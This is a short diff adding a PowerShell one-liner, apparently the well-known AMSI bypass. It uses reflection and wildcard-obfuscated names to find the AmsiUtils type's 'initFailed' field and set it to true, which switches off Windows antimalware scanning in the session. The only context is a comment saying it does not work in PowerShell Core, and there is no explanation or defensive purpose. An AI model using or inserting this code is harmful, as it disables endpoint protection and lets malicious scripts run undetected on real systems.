@@ -1,0 +1,3 @@
+# Does not work in PowerShell Core
+$Var = [Ref].Assembly.GetTypes() | %{if ($_.Name -like "*Am*s*ils*") {$_.GetFields("NonPublic,Static") | ?{$_.Name -like "*ailed*"}}}
+$Var.SetValue($NULL,$TRUE)
